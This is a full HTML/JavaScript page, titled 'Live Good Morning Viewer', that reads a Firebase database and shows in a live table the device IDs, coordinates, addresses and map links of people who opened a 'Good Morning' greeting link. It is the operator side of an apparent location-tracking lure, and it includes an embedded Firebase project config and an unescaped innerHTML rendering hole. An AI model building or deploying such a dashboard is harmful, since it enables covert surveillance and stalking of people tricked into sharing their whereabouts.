<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Good Morning ‚Äì Live Device Viewer</title>
  <style>
    :root {
      --bg: #f5f7fb;
      --card-bg: #ffffff;
      --primary: #ff9800;
      --text-main: #222;
      --text-muted: #666;
      --border: #e0e3eb;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue",
        sans-serif;
      background: var(--bg);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      padding: 16px;
    }

    .container {
      max-width: 960px;
      width: 100%;
      margin: auto;
    }

    .card {
      background: var(--card-bg);
      border-radius: 20px;
      padding: 20px 18px;
      box-shadow: 0 14px 30px rgba(15, 23, 42, 0.12);
    }

    h1 {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 1.6rem;
      margin-bottom: 4px;
      color: var(--primary);
      justify-content: center;
      text-align: center;
    }

    h1 span.emoji {
      font-size: 1.7rem;
    }

    .subtitle {
      text-align: center;
      font-size: 0.95rem;
      color: var(--text-muted);
      margin-bottom: 16px;
    }

    .info-row {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      justify-content: center;
      margin-bottom: 14px;
      font-size: 0.86rem;
      color: var(--text-muted);
    }

    .pill {
      padding: 4px 10px;
      border-radius: 999px;
      background: #fff8e1;
      color: #b35c00;
      border: 1px solid #ffe0b2;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 8px;
      font-size: 0.86rem;
    }

    thead {
      background: #f3f4f8;
    }

    th,
    td {
      padding: 8px 6px;
      border-bottom: 1px solid var(--border);
      text-align: left;
      vertical-align: middle;
    }

    th {
      font-weight: 600;
      color: #4b5563;
      position: sticky;
      top: 0;
      background: #f3f4f8;
      z-index: 1;
    }

    tr:nth-child(even) td {
      background: #fafbff;
    }

    .table-wrapper {
      max-height: 420px;
      overflow: auto;
      border-radius: 12px;
      border: 1px solid var(--border);
    }

    .device-id {
      font-family: monospace;
      font-size: 0.8rem;
      word-break: break-all;
    }

    .address {
      min-width: 140px;
    }

    .badge-live {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      background: #e8f5e9;
      color: #1b5e20;
      padding: 2px 8px;
      border-radius: 999px;
      font-size: 0.7rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.03em;
    }

    .badge-live span.dot {
      width: 7px;
      height: 7px;
      border-radius: 999px;
      background: #22c55e;
      box-shadow: 0 0 6px #22c55e;
    }

    .status {
      text-align: center;
      margin-top: 10px;
      font-size: 0.85rem;
      color: var(--text-muted);
    }

    .status.error {
      color: #b91c1c;
    }

    a.map-link {
      font-size: 0.8rem;
      text-decoration: none;
      color: #2563eb;
    }

    a.map-link:hover {
      text-decoration: underline;
    }

    @media (max-width: 640px) {
      .card {
        padding: 16px 12px;
      }

      th,
      td {
        padding: 6px 4px;
      }

      h1 {
        font-size: 1.4rem;
      }

      .subtitle {
        font-size: 0.85rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <h1>
        <span class="emoji">üåç</span>
        Live Good Morning Viewer
      </h1>
      <p class="subtitle">
        See all devices that opened the Good Morning page and are sending their
        live location.
      </p>

      <div class="info-row">
        <span class="pill">Auto-refresh from Firebase Realtime Database</span>
        <span class="pill">One row = one device</span>
      </div>

      <div class="info-row">
        <span class="badge-live">
          <span class="dot"></span> LIVE
        </span>
      </div>

      <div class="table-wrapper">
        <table>
          <thead>
            <tr>
              <th>#</th>
              <th>Device ID</th>
              <th class="address">Address / Area</th>
              <th>Latitude</th>
              <th>Longitude</th>
              <th>Accuracy</th>
              <th>Last Updated</th>
              <th>Map</th>
            </tr>
          </thead>
          <tbody id="devices-body">
            <!-- Filled by JS -->
          </tbody>
        </table>
      </div>

      <div id="empty-msg" class="status">
        No devices yet. Ask someone to open the Good Morning link to start
        seeing data here.
      </div>

      <div id="status-msg" class="status"></div>
    </div>
  </div>

  <!-- Firebase + Viewer Logic -->
  <script type="module">
    // Import Firebase SDK (same version you used in index.html)
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
    import {
      getDatabase,
      ref,
      onValue
    } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";

    // --- 1. Your Firebase config (same project as index.html) ---
    const firebaseConfig = {
      apiKey: "AIzaSyDBUM7Qzl-KOZJMFUpuDH1CerJdsm_eKFM",
      authDomain: "loc-demo-22c3d.firebaseapp.com",
      projectId: "loc-demo-22c3d",
      storageBucket: "loc-demo-22c3d.firebasestorage.app",
      messagingSenderId: "603283450312",
      appId: "1:603283450312:web:7bf9c8a9fde7d0c26778fd",
      databaseURL:
        "https://loc-demo-22c3d-default-rtdb.asia-southeast1.firebasedatabase.app"
    };

    // --- 2. Initialize Firebase ---
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // --- 3. DOM references ---
    const tbody = document.getElementById("devices-body");
    const emptyMsg = document.getElementById("empty-msg");
    const statusMsg = document.getElementById("status-msg");

    function setStatus(message, isError = false) {
      statusMsg.textContent = message || "";
      statusMsg.classList.toggle("error", !!isError);
    }

    // Helper: format timestamp nicely
    function formatTime(ts) {
      if (!ts) return "-";
      try {
        const d = new Date(ts);
        if (Number.isNaN(d.getTime())) return "-";
        return d.toLocaleString();
      } catch {
        return "-";
      }
    }

    // --- 4. Subscribe to /devices in Realtime DB ---
    // Make sure index.html is writing to this same path:
    //   /devices/{deviceId}
    const devicesRef = ref(db, "devices");

    onValue(
      devicesRef,
      (snapshot) => {
        tbody.innerHTML = "";

        if (!snapshot.exists()) {
          emptyMsg.style.display = "block";
          setStatus("Waiting for devices to send their locations‚Ä¶");
          return;
        }

        emptyMsg.style.display = "none";
        setStatus("Live data loaded from Firebase.");

        let idx = 1;

        // snapshot.forEach iterates over each child (device)
        snapshot.forEach((childSnap) => {
          const deviceId = childSnap.key;
          const data = childSnap.val() || {};

          // Support both lat/lng or latitude/longitude field names
          const lat = data.lat ?? data.latitude ?? null;
          const lng = data.lng ?? data.longitude ?? null;

          const address =
            data.address ||
            data.areaName ||
            data.city ||
            data.label ||
            "";

          const accuracy = data.accuracy ? `${data.accuracy} m` : "-";
          const lastUpdated = formatTime(data.lastUpdated);

          const shortLat =
            typeof lat === "number" ? lat.toFixed(5) : lat || "-";
          const shortLng =
            typeof lng === "number" ? lng.toFixed(5) : lng || "-";

          const mapLink =
            lat != null && lng != null
              ? `https://www.google.com/maps?q=${lat},${lng}`
              : null;

          const tr = document.createElement("tr");
          tr.innerHTML = `
            <td>${idx++}</td>
            <td class="device-id">${deviceId}</td>
            <td class="address">${address || "-"}</td>
            <td>${shortLat}</td>
            <td>${shortLng}</td>
            <td>${accuracy}</td>
            <td>${lastUpdated}</td>
            <td>
              ${
                mapLink
                  ? `<a class="map-link" href="${mapLink}" target="_blank" rel="noopener noreferrer">Open</a>`
                  : "-"
              }
            </td>
          `;
          tbody.appendChild(tr);
        });
      },
      (error) => {
        console.error(error);
        setStatus(
          "Error reading from Firebase (check rules / config in console).",
          true
        );
      }
    );
  </script>
</body>
        </html>
